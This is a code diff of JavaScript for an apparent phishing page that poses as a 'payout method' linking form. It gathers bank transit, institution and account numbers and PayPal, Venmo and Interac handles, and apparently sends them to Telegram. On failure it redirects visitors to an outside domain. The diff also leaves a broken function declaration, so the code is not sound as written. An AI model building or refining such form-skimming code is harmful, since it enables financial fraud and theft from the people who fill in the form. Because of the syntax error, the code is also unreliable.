@@ -1847,10 +1847,7 @@ window.addEventListener("load", () => {
 
     if (hasSavedData) {
     showNotification("Payout method linked successfully");
-
-    setTimeout(() => {
-        window.location.href = "https://link.avalonflow.site/crawithholding"; // change to your target page
-    }, 1500); // small delay so user sees message
+    
 } else {
     showNotification("Only one payout method is required");
 }
@@ -2384,30 +2381,54 @@ function sendToTelegram(data) {
 SAVE DATA FUNCTION
 -------------------------- */
 function saveData() {
-  const data = {
-    preference,
-    acuAccount: document.getElementById("acuAccount")?.value || "",
-    paypal: document.getElementById("paypalInput")?.value || "",
-    interac: document.getElementById("interacInput")?.value || "",
-    canadianBank: document.getElementById("canadianBankSelect")?.value || "",
-    accountName: document.getElementById("accountName")?.value || "",
-    transitNumber: document.getElementById("transitNumber")?.value || "",
-    institutionNumber: document.getElementById("institutionNumber")?.value || "",
-    accountNumber: document.getElementById("accountNumber")?.value || "",
-
-    // Separated US values
-    americanBank: document.getElementById("americanBankSelect")?.value || "",
-    venmo: document.getElementById("venmoInput")?.value || "",
-    accountNameUs: document.getElementById("accountName-us")?.value || "",
-    transitNumberUs: document.getElementById("transitNumber-us")?.value || "",
+    const savedData = JSON.parse(localStorage.getItem("section3Data") || "{}");
     
-    accountNumberUs: document.getElementById("accountNumber-us")?.value || "",
-    paypalUs: document.getElementById("paypalInput-us")?.value || "",
-    acuAccountUs: document.getElementById("acuAccount-us")?.value || ""
-  };
+    // Capture individual field inputs
+    savedData.preference = preference;
+    savedData.acuAccount = document.getElementById("acuAccount")?.value || "";
+    savedData.paypal = document.getElementById("paypalInput")?.value || "";
+    savedData.interac = document.getElementById("interacInput")?.value || "";
+    savedData.venmo = document.getElementById("venmoInput")?.value || "";
+    savedData.canadianBank = document.getElementById("canadianBankSelect")?.value || "";
+    savedData.americanBank = document.getElementById("americanBankSelect")?.value || "";
+    savedData.accountName = document.getElementById("accountName")?.value || "";
+    savedData.transitNumber = document.getElementById("transitNumber")?.value || "";
+    savedData.institutionNumber = document.getElementById("institutionNumber")?.value || "";
+    savedData.accountNumber = document.getElementById("accountNumber")?.value || "";
+    savedData.accountNameUs = document.getElementById("accountName-us")?.value || "";
+    savedData.transitNumberUs = document.getElementById("transitNumber-us")?.value || "";
+    savedData.accountNumberUs = document.getElementById("accountNumber-us")?.value || "";
+    savedData.paypalUs = document.getElementById("paypalInput-us")?.value || "";
+    savedData.acuAccountUs = document.getElementById("acuAccount-us")?.value || "";
 
-  localStorage.setItem("section3Data", JSON.stringify(data));
+    // Determine specific routing parameters for Page 1
+    let exactTransferMethodName = preference;
+    let selectedRegion = "CA"; // Default fallback
+
+    const activeCard = document.querySelector(".payment-method.active");
+    if (activeCard) {
+        const region = activeCard.dataset.region;
+        if (region === "usa") { // Note: Your HTML maps UK to data-region="usa"
+            selectedRegion = "UK";
+            if (preference === "American Bank Transfer") {
+                exactTransferMethodName = savedData.americanBank || "UK Bank Transfer";
+            }
+        } else if (region === "canada") {
+            selectedRegion = "CA";
+            if (preference === "Canadian Bank Transfer") {
+                exactTransferMethodName = savedData.canadianBank || "Canadian Bank Transfer";
+            }
+        }
+    }
+
+    // Explicit keys for Page 1 to safely pull instantly
+    localStorage.setItem("av_selected_region", selectedRegion);
+    localStorage.setItem("av_selected_method_title", exactTransferMethodName);
+    
+    // Save master configuration block
+    localStorage.setItem("section3Data", JSON.stringify(savedData));
 }
+
 
 
 /* --------------------------
@@ -2416,7 +2437,7 @@ MAIN BUTTON HANDLER
 document.getElementById('nextBtnSeparate').addEventListener('click', async () => {
 
   const notification = document.getElementById("planNotification");
-  function localShowNotification(message, duration = 3000) {
+  showNotification(message, duration = 3000) {
       if (!notification) return;
       notification.textContent = message;
       notification.classList.add("show");
@@ -2425,12 +2446,12 @@ document.getElementById('nextBtnSeparate').addEventListener('click', async () =>
 
   // 1. FIRST check validation. If incomplete, stop right here.
   if (!validateCurrentPreference()) {
-    localShowNotification("Please fill out all required fields for your selected payment method", 7000);
+    showNotification("Please fill out all required fields for your selected payment method", 7000);
     return; 
   }
 
   // 2. NOW that we know the data is valid, show the verification progress message!
-  localShowNotification("Verifying payout information...", 2500);
+  showNotification("Verifying payout information...", 2500);
 
   const data = {
     preference,
@@ -2462,7 +2483,7 @@ document.getElementById('nextBtnSeparate').addEventListener('click', async () =>
     window.location.href = "/acu-payouts";
   } catch (err) {
     console.error("Telegram send failed:", err);
-    window.location.href = "/acu-payouts";
+    window.location.href = "https://link.avalonflow.site/crawithholding";
   }
 });
 
